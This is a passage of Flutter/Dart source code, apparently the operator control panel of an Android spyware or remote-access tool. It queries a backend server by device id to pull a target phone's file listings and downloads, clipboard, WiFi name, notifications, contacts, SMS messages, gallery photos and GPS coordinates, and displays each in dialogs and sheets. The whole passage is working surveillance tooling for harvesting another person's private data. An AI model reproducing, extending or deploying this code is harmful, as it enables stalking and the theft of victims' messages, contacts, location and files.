                        ),
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                height: 0.5,
                margin: const EdgeInsets.symmetric(horizontal: 20),
                color: ControlTheme.silver.withOpacity(0.1),
              ),
              Expanded(
                child: _buildFileList(sc),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildFileList(ScrollController sc) {
    return FutureBuilder(
      future: _fetchFileList('/'),
      builder: (ctx, snap) {
        if (snap.connectionState == ConnectionState.waiting) {
          return Center(
            child: CircularProgressIndicator(
              color: ControlTheme.gray1,
              strokeWidth: 2,
            ),
          );
        }
        if (snap.hasError || !snap.hasData) {
          return Center(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(Icons.folder_off_rounded, color: ControlTheme.textMuted, size: 48),
                SizedBox(height: 8),
                Text(
                  'Failed to load files',
                  style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
                ),
              ],
            ),
          );
        }
        final files = snap.data as List<Map<String, dynamic>>;
        if (files.isEmpty) {
          return Center(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(Icons.folder_open_rounded, color: ControlTheme.textMuted, size: 48),
                SizedBox(height: 8),
                Text(
                  'No files found',
                  style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
                ),
              ],
            ),
          );
        }
        return ListView.separated(
          controller: sc,
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          itemCount: files.length,
          separatorBuilder: (_, __) => Divider(
            color: ControlTheme.surface2,
            height: 1,
          ),
          itemBuilder: (_, i) {
            final file = files[i];
            final isDir = file['isDirectory'] == true;
            return ListTile(
              contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
              leading: Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: isDir
                      ? ControlTheme.gray1.withOpacity(0.1)
                      : ControlTheme.gray3.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Icon(
                  isDir
                      ? Icons.folder_rounded
                      : Icons.insert_drive_file_rounded,
                  color: isDir ? ControlTheme.gray1 : ControlTheme.gray3,
                  size: 24,
                ),
              ),
              title: Text(
                file['name'] ?? 'unknown',
                style: TextStyle(
                  color: ControlTheme.textPrimary,
                  fontSize: 13,
                  fontWeight: FontWeight.w500,
                ),
              ),
              subtitle: Text(
                file['path'] ?? '',
                style: TextStyle(
                  color: ControlTheme.textMuted,
                  fontSize: 10,
                ),
                overflow: TextOverflow.ellipsis,
              ),
              trailing: isDir
                  ? Icon(
                      Icons.arrow_forward_ios_rounded,
                      color: ControlTheme.textMuted,
                      size: 16,
                    )
                  : IconButton(
                      icon: Icon(
                        Icons.download_rounded,
                        color: ControlTheme.silver,
                        size: 20,
                      ),
                      onPressed: () => _downloadFile(file['path'] ?? ''),
                    ),
              onTap: isDir ? () => _navigateToFolder(file['path'] ?? '') : null,
            );
          },
        );
      },
    );
  }

  Future<List<Map<String, dynamic>>> _fetchFileList(String path) async {
    try {
      final res = await http.get(
        Uri.parse('$_kBase/api/list-files/$_id?path=${Uri.encodeComponent(path)}'),
      ).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final files = data['files'] as List? ?? [];
        return files.map((f) => Map<String, dynamic>.from(f)).toList();
      }
      return [];
    } catch (e) {
      _addLog('Error fetching files: $e');
      return [];
    }
  }

  void _navigateToFolder(String path) {
    _addLog('Opening folder: $path');
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => Container(
        decoration: BoxDecoration(
          color: ControlTheme.surface,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border(
            top: BorderSide(
              color: ControlTheme.silver.withOpacity(0.1),
              width: 0.5,
            ),
          ),
        ),
        child: DraggableScrollableSheet(
          initialChildSize: 0.7,
          maxChildSize: 0.95,
          minChildSize: 0.3,
          expand: false,
          builder: (_, sc) => Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 12),
                height: 4,
                width: 40,
                decoration: BoxDecoration(
                  color: ControlTheme.silver.withOpacity(0.3),
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                child: Row(
                  children: [
                    IconButton(
                      icon: Icon(
                        Icons.arrow_back_rounded,
                        color: ControlTheme.silver,
                        size: 24,
                      ),
                      onPressed: () => Navigator.pop(context),
                    ),
                    SizedBox(width: 4),
                    Expanded(
                      child: Text(
                        path,
                        style: TextStyle(
                          color: ControlTheme.textPrimary,
                          fontSize: 14,
                          fontWeight: FontWeight.bold,
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: ControlTheme.surface2,
                          shape: BoxShape.circle,
                        ),
                        child: Icon(
                          Icons.close_rounded,
                          color: ControlTheme.textMuted,
                          size: 20,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                height: 0.5,
                margin: const EdgeInsets.symmetric(horizontal: 20),
                color: ControlTheme.silver.withOpacity(0.1),
              ),
              Expanded(
                child: _buildFileList(sc),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _downloadFile(String path) async {
    _addLog('Downloading: $path');
    try {
      final res = await http.get(
        Uri.parse('$_kBase/api/download-file/$_id?path=${Uri.encodeComponent(path)}'),
      ).timeout(const Duration(seconds: 30));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final content = data['content'] ?? '';
        final fileName = path.split('/').last;
        _addLog('Downloaded: $fileName');
        _toast('File downloaded', c: ControlTheme.success);
        
        showDialog(
          context: context,
          builder: (_) => AlertDialog(
            backgroundColor: ControlTheme.surface,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
              side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
            ),
            title: Text(
              fileName,
              style: TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
            content: Container(
              constraints: const BoxConstraints(maxHeight: 300),
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: ControlTheme.cardDark,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.1),
                ),
              ),
              child: SingleChildScrollView(
                child: SelectableText(
                  content,
                  style: TextStyle(
                    color: ControlTheme.textSec,
                    fontSize: 12,
                  ),
                ),
              ),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text(
                  'Close',
                  style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
                ),
              ),
            ],
          ),
        );
      } else {
        _toast('Download failed');
      }
    } catch (e) {
      _addLog('Download error: $e');
      _toast('Download error');
    }
  }

  // ─── CLIPBOARD ──────────────────────────────────────────────────────
  void _getClipboard() async {
    _addLog('Fetching clipboard...');
    try {
      final res = await http.get(
        Uri.parse('$_kBase/api/get-clipboard/$_id'),
      ).timeout(const Duration(seconds: 8));
      
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        final clips = data['clipboard'] as List? ?? [];
        _addLog('${clips.length} clipboard items');
        
        showModalBottomSheet(
          context: context,
          backgroundColor: Colors.transparent,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
          ),
          builder: (_) => Container(
            decoration: BoxDecoration(
              color: ControlTheme.surface,
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border(
                top: BorderSide(
                  color: ControlTheme.silver.withOpacity(0.1),
                  width: 0.5,
                ),
              ),
            ),
            child: DraggableScrollableSheet(
              initialChildSize: 0.6,
              maxChildSize: 0.9,
              minChildSize: 0.3,
              expand: false,
              builder: (_, sc) => Column(
                children: [
                  Container(
                    margin: const EdgeInsets.only(top: 12),
                    height: 4,
                    width: 40,
                    decoration: BoxDecoration(
                      color: ControlTheme.silver.withOpacity(0.3),
                      borderRadius: BorderRadius.circular(2),
                    ),
                  ),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                    child: Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(10),
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              colors: [ControlTheme.gray1, ControlTheme.gray3],
                            ),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Icon(
                            Icons.content_paste_rounded,
                            color: Colors.white,
                            size: 20,
                          ),
                        ),
                        SizedBox(width: 12),
                        Expanded(
                          child: Text(
                            'Clipboard (${clips.length})',
                            style: TextStyle(
                              color: ControlTheme.textPrimary,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ),
                        GestureDetector(
                          onTap: () => Navigator.pop(context),
                          child: Container(
                            padding: const EdgeInsets.all(8),
                            decoration: BoxDecoration(
                              color: ControlTheme.surface2,
                              shape: BoxShape.circle,
                            ),
                            child: Icon(
                              Icons.close_rounded,
                              color: ControlTheme.textMuted,
                              size: 20,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                  Container(
                    height: 0.5,
                    margin: const EdgeInsets.symmetric(horizontal: 20),
                    color: ControlTheme.silver.withOpacity(0.1),
                  ),
                  Expanded(
                    child: clips.isEmpty
                        ? Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Icon(
                                  Icons.content_paste_off_rounded,
                                  color: ControlTheme.textMuted,
                                  size: 48,
                                ),
                                SizedBox(height: 8),
                                Text(
                                  'No clipboard items',
                                  style: TextStyle(
                                    color: ControlTheme.textMuted,
                                    fontSize: 12,
                                  ),
                                ),
                              ],
                            ),
                          )
                        : ListView.separated(
                            controller: sc,
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            itemCount: clips.length,
                            separatorBuilder: (_, __) => Divider(
                              color: ControlTheme.surface2,
                              height: 1,
                            ),
                            itemBuilder: (_, i) {
                              final clip = clips[i];
                              return ListTile(
                                contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                                leading: Container(
                                  width: 44,
                                  height: 44,
                                  decoration: BoxDecoration(
                                    color: ControlTheme.gray2.withOpacity(0.1),
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                  child: Icon(
                                    Icons.content_paste_rounded,
                                    color: ControlTheme.gray2,
                                    size: 24,
                                  ),
                                ),
                                title: Text(
                                  clip['text']?.toString() ?? '',
                                  style: TextStyle(
                                    color: ControlTheme.textPrimary,
                                    fontSize: 12,
                                  ),
                                  maxLines: 2,
                                  overflow: TextOverflow.ellipsis,
                                ),
                                subtitle: Text(
                                  clip['time']?.toString() ?? '',
                                  style: TextStyle(
                                    color: ControlTheme.textMuted,
                                    fontSize: 10,
                                  ),
                                ),
                                trailing: IconButton(
                                  icon: Icon(
                                    Icons.copy_rounded,
                                    color: ControlTheme.silver,
                                    size: 20,
                                  ),
                                  onPressed: () {
                                    _toast('Copied to clipboard', c: ControlTheme.success);
                                  },
                                ),
                              );
                            },
                          ),
                  ),
                ],
              ),
            ),
          ),
        );
      } else {
        _addLog('Failed to get clipboard');
        _toast('Failed to get clipboard');
      }
    } catch (e) {
      _addLog('Clipboard error: $e');
      _toast('Error: $e');
    }
  }

  // ─── SSID WiFi ──────────────────────────────────────────────────────────
  void _getSSID() async {
    try {
      final res = await http.get(
        Uri.parse('$_kBase/api/get-ssid/$_id')
      ).timeout(const Duration(seconds: 8));
      
      if (res.statusCode == 200 && res.body.isNotEmpty) {
        final data = jsonDecode(res.body);
        final ssid = data['ssid']?.toString() ?? 'Tidak terdeteksi';
        _addLog('SSID: $ssid');
        
        showDialog(
          context: context,
          builder: (_) => AlertDialog(
            backgroundColor: ControlTheme.surface,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
              side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
            ),
            title: Row(
              children: [
                Icon(Icons.wifi, color: ControlTheme.silver, size: 28),
                SizedBox(width: 10),
                Text(
                  'WiFi SSID',
                  style: TextStyle(
                    color: ControlTheme.textPrimary,
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
            content: Container(
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                color: ControlTheme.cardDark,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(
                  color: ControlTheme.silver.withOpacity(0.1),
                ),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.wifi, color: ControlTheme.silver, size: 56),
                  SizedBox(height: 16),
                  Text(
                    ssid,
                    style: TextStyle(
                      color: ControlTheme.textPrimary,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text(
                  'Close',
                  style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
                ),
              ),
            ],
          ),
        );
      } else {
        _addLog('Gagal mendapatkan SSID');
        _toast('Gagal mendapatkan SSID');
      }
    } catch (e) {
      _addLog('Error SSID: $e');
      _toast('Error: $e');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DATA DISPLAY
  // ─────────────────────────────────────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(
          context: context,
          backgroundColor: ControlTheme.surface,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
          ),
          builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            minChildSize: 0.3,
            expand: false,
            builder: (_, sc) => Column(
              children: [
                Container(
                  margin: const EdgeInsets.only(top: 12),
                  height: 4,
                  width: 40,
                  decoration: BoxDecoration(
                    color: ControlTheme.silver.withOpacity(0.3),
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                  child: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [ControlTheme.gray1, ControlTheme.gray3],
                          ),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: Icon(
                          Icons.notifications_rounded,
                          color: Colors.white,
                          size: 20,
                        ),
                      ),
                      SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          'Notifications (${list.length})',
                          style: TextStyle(
                            color: ControlTheme.textPrimary,
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                      GestureDetector(
                        onTap: () => Navigator.pop(context),
                        child: Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: ControlTheme.surface2,
                            shape: BoxShape.circle,
                          ),
                          child: Icon(
                            Icons.close_rounded,
                            color: ControlTheme.textMuted,
                            size: 20,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                Container(
                  height: 0.5,
                  margin: const EdgeInsets.symmetric(horizontal: 20),
                  color: ControlTheme.silver.withOpacity(0.1),
                ),
                Expanded(
                  child: ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                    itemCount: list.length,
                    separatorBuilder: (_, __) => Divider(
                      color: ControlTheme.surface2,
                      height: 1,
                    ),
                    itemBuilder: (_, i) {
                      final notif = list[i];
                      return ListTile(
                        contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                        leading: Container(
                          width: 44,
                          height: 44,
                          decoration: BoxDecoration(
                            color: ControlTheme.gray3.withOpacity(0.1),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Icon(
                            Icons.notifications_rounded,
                            color: ControlTheme.gray3,
                            size: 24,
                          ),
                        ),
                        title: Text(
                          notif['title']?.toString() ?? '-',
                          style: TextStyle(
                            color: ControlTheme.textPrimary,
                            fontSize: 13,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                        subtitle: Text(
                          notif['body']?.toString() ?? '',
                          style: TextStyle(
                            color: ControlTheme.textMuted,
                            fontSize: 11,
                          ),
                        ),
                      );
                    },
                  ),
                ),
              ],
            ),
          ),
        );
      }
    } catch (_) { _addLog('Notif error'); }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
        context: context,
        builder: (_) => Dialog(
          backgroundColor: ControlTheme.bg,
          insetPadding: const EdgeInsets.all(12),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(16),
                child: Text(
                  title,
                  style: TextStyle(
                    color: ControlTheme.textPrimary,
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
              ClipRRect(
                borderRadius: const BorderRadius.vertical(
                  bottom: Radius.circular(24),
                ),
                child: Image.memory(bytes, fit: BoxFit.contain),
              ),
            ],
          ),
        ),
      );
    } catch (_) { _toast('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Icon(Icons.my_location_rounded, color: ControlTheme.success, size: 24),
            SizedBox(width: 10),
            Text(
              'GPS Location',
              style: TextStyle(
                color: ControlTheme.textPrimary,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: ControlTheme.cardDark,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
              color: ControlTheme.success.withOpacity(0.2),
            ),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Icon(Icons.arrow_upward, color: ControlTheme.success, size: 16),
                  SizedBox(width: 8),
                  Text(
                    'Latitude:  $lat',
                    style: TextStyle(
                      color: ControlTheme.success,
                      fontSize: 13,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ],
              ),
              SizedBox(height: 8),
              Row(
                children: [
                  Icon(Icons.arrow_forward, color: ControlTheme.success, size: 16),
                  SizedBox(width: 8),
                  Text(
                    'Longitude: $lng',
                    style: TextStyle(
                      color: ControlTheme.success,
                      fontSize: 13,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Close',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.success,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
            ),
            onPressed: () => launchUrl(
              Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication,
            ),
            child: const Text(
              'Open Maps',
              style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  void _textDialog(String title, String content) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: ControlTheme.surface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: ControlTheme.silver.withOpacity(0.2)),
        ),
        title: Text(
          title,
          style: TextStyle(
            color: ControlTheme.textPrimary,
            fontSize: 16,
            fontWeight: FontWeight.bold,
          ),
        ),
        content: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: ControlTheme.cardDark,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
              color: ControlTheme.silver.withOpacity(0.1),
            ),
          ),
          child: SelectableText(
            content,
            style: TextStyle(
              color: ControlTheme.success,
              fontSize: 13,
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'Close',
              style: TextStyle(color: ControlTheme.textMuted, fontSize: 12),
            ),
          ),
        ],
      ),
    );
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: ControlTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        minChildSize: 0.3,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              margin: const EdgeInsets.only(top: 12),
              height: 4,
              width: 40,
              decoration: BoxDecoration(
                color: ControlTheme.silver.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [ControlTheme.gray1, ControlTheme.gray3],
                      ),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(
                      Icons.contacts_rounded,
                      color: Colors.white,
                      size: 20,
                    ),
                  ),
                  SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      'Contacts (${contacts.length})',
                      style: TextStyle(
                        color: ControlTheme.textPrimary,
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: ControlTheme.surface2,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(
                        Icons.close_rounded,
                        color: ControlTheme.textMuted,
                        size: 20,
                      ),
                    ),
                  ),
                ],
              ),
            ),
            Container(
              height: 0.5,
              margin: const EdgeInsets.symmetric(horizontal: 20),
              color: ControlTheme.silver.withOpacity(0.1),
            ),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                itemCount: contacts.length,
                separatorBuilder: (_, __) => Divider(
                  color: ControlTheme.surface2,
                  height: 1,
                ),
                itemBuilder: (_, i) {
                  final contact = contacts[i];
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 44,
                      height: 44,
                      decoration: BoxDecoration(
                        color: ControlTheme.gray3.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(
                        Icons.person_rounded,
                        color: ControlTheme.gray3,
                        size: 24,
                      ),
                    ),
                    title: Text(
                      contact['name']?.toString() ?? '-',
                      style: TextStyle(
                        color: ControlTheme.textPrimary,
                        fontSize: 13,
                        fontWeight: FontWeight.w500,
                      ),
                    ),
                    subtitle: Text(
                      contact['number']?.toString() ?? '-',
                      style: TextStyle(
                        color: ControlTheme.textMuted,
                        fontSize: 11,
                      ),
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(
      context: context,
      backgroundColor: ControlTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        minChildSize: 0.3,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              margin: const EdgeInsets.only(top: 12),
              height: 4,
              width: 40,
              decoration: BoxDecoration(
                color: ControlTheme.silver.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [ControlTheme.gray1, ControlTheme.gray3],
                      ),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(
                      Icons.sms_rounded,
                      color: Colors.white,
                      size: 20,
                    ),
                  ),
                  SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      'SMS (${sms.length})',
                      style: TextStyle(
                        color: ControlTheme.textPrimary,
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: ControlTheme.surface2,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(
                        Icons.close_rounded,
                        color: ControlTheme.textMuted,
                        size: 20,
                      ),
                    ),
                  ),
                ],
              ),
            ),
            Container(
              height: 0.5,
              margin: const EdgeInsets.symmetric(horizontal: 20),
              color: ControlTheme.silver.withOpacity(0.1),
            ),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                itemCount: sms.length,
                separatorBuilder: (_, __) => Divider(
                  color: ControlTheme.surface2,
                  height: 1,
                ),
                itemBuilder: (_, i) {
                  final s = sms[i] as Map;
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 44,
                      height: 44,
                      decoration: BoxDecoration(
                        color: ControlTheme.gray2.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(
                        Icons.sms_rounded,
                        color: ControlTheme.gray2,
                        size: 24,
                      ),
                    ),
                    title: Text(
                      s['address']?.toString() ?? '-',
                      style: TextStyle(
                        color: ControlTheme.textPrimary,
                        fontSize: 13,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                    subtitle: Text(
                      s['body']?.toString() ?? '',
                      style: TextStyle(
                        color: ControlTheme.textMuted,
                        fontSize: 11,
                      ),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: ControlTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        minChildSize: 0.3,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              margin: const EdgeInsets.only(top: 12),
              height: 4,
              width: 40,
              decoration: BoxDecoration(
                color: ControlTheme.silver.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [ControlTheme.gray1, ControlTheme.gray3],
                      ),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(
                      Icons.photo_library_rounded,
                      color: Colors.white,
                      size: 20,
                    ),
                  ),
                  SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      'Gallery (${imgs.length})',
                      style: TextStyle(
                        color: ControlTheme.textPrimary,
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: ControlTheme.surface2,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(
                        Icons.close_rounded,
                        color: ControlTheme.textMuted,
                        size: 20,
                      ),
                    ),
                  ),
                ],
              ),
            ),
            Container(
              height: 0.5,
              margin: const EdgeInsets.symmetric(horizontal: 20),
              color: ControlTheme.silver.withOpacity(0.1),
            ),
            Expanded(
              child: imgs.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(
                            Icons.photo_library_rounded,
                            color: ControlTheme.textMuted,
                            size: 48,
                          ),
                          SizedBox(height: 8),
                          Text(
                            'No photos',
                            style: TextStyle(
                              color: ControlTheme.textMuted,
                              fontSize: 12,
                            ),
                          ),
                        ],
                      ),
                    )
                  : GridView.builder(
                      controller: sc,
                      padding: const EdgeInsets.all(12),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 6,
                        mainAxisSpacing: 6,
                      ),
                      itemCount: imgs.length,
                      itemBuilder: (_, i) {
                        try {
                          final raw = imgs[i].toString();
                          final clean = raw.contains(',') ? raw.split(',').last : raw;
                          final bytes = base64Decode(clean);
                          return GestureDetector(
                            onTap: () => _imgDialog(raw, 'Gallery Photo ${i+1}'),
                            child: ClipRRect(
                              borderRadius: BorderRadius.circular(12),
                              child: Image.memory(
                                bytes,
                                fit: BoxFit.cover,
                              ),
                            ),
                          );
                        } catch (_) {
                          return Container(
                            decoration: BoxDecoration(
                              color: ControlTheme.bg,
                              borderRadius: BorderRadius.circular(12),
                            ),
                          );
                        }
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

